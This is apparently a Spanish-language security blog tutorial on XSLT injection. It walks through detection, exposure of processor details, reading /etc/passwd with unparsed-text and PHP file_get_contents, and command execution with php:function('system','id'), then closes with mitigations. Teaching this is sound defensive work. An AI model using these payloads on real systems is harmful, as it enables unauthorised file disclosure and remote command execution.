---
date: 2025-10-22T21:34:05.000Z
layout: post
comments: true
title: "eXtensible Stylesheet Language Transformation Injection"
subtitle: 'XSLT'
description: >-
image: >-
  https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/xsltlogo.png
optimized_image: >-
  https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/xsltlogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - php
  - xslt
author: Felipe Canales Cayuqueo
paginate: true
---

XSLT es un lenguaje para transformar documentos XML mediante plantillas (```<xsl:template>```) y expresiones como ```<xsl:for-each>```, ```<xsl:value-of>```, ```<xsl:sort>``` y ```<xsl:if>```, lo que permite construir salidas arbitrarias (por ejemplo HTML) a partir de datos XML. Las plantillas seleccionan nodos XML mediante rutas y pueden iterar, filtrar y ordenar los datos antes de imprimirlos, por lo que XSLT es útil para definir formatos reutilizables y enriquecidos a partir de XML.

La inyección XSLT ocurre cuando la entrada del usuario se incorpora sin saneamiento al propio documento XSLT; así, un atacante puede insertar elementos XSL maliciosos que el procesador ejecutará (por ejemplo, rutas adicionales, condiciones o inclusiones), provocando divulgación de datos o comportamientos no deseados. Para minimizar este riesgo, la entrada del usuario nunca debe concatenarse directamente en plantillas XSLT: hay que validarla, escapar o usar mecanismos seguros para pasar datos como parámetros en lugar de modificar la estructura XSLT.

### Identificación

Para poder evaluar si una aplicación es vulnerable, debemos ingresar el siguiente payload:

```
<
```

Como podemos ver, la aplicación web responde con un error del servidor. Si bien esto no confirma que exista una vulnerabilidad de inyección XSLT, podría indicar su presencia.

### Explotación

#### Divulgación de información

Podemos obtener información básica sobre el XSLT

```
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

#### Local File Inclusion

XSLT contiene una función ```unparsed-text``` que se puede utilizar para leer un archivo local.

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

Destacar que el payload anterior solo funciona en la versión 2.0 de XSLT. Por lo tanto, nuestra aplicación web de muestra no admite esta función y, en cambio, genera un error. Sin embargo, si la biblioteca XSLT está configurada para admitir funciones PHP, podemos llamar a la función PHP ```file_get_contents```.

```
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

#### Ejecución remota de comandos (RCE)

Si un procesador XSLT admite funciones PHP, podemos llamar a una función PHP que ejecuta un comando del sistema local para obtener RCE.

```
<xsl:value-of select="php:function('system','id')" />
```

### Recomendaciones

Para prevenir la inyección XSLT, es fundamental evitar insertar directamente datos proporcionados por el usuario en las plantillas XSL, y en caso de que sea necesario, aplicar una validación y desinfección exhaustiva de la entrada. También se recomienda codificar los caracteres HTML especiales (por ejemplo, reemplazar ```<``` y ```>``` por ```&lt;``` y ```&gt;```) antes de procesar la plantilla, para impedir la inserción de elementos XSL maliciosos. Como medidas adicionales de seguridad, conviene ejecutar el procesador XSLT con privilegios mínimos, deshabilitar funciones externas (como las de PHP o llamadas al sistema) y mantener la biblioteca XSLT actualizada, reduciendo así la posibilidad y el impacto de una posible explotación.

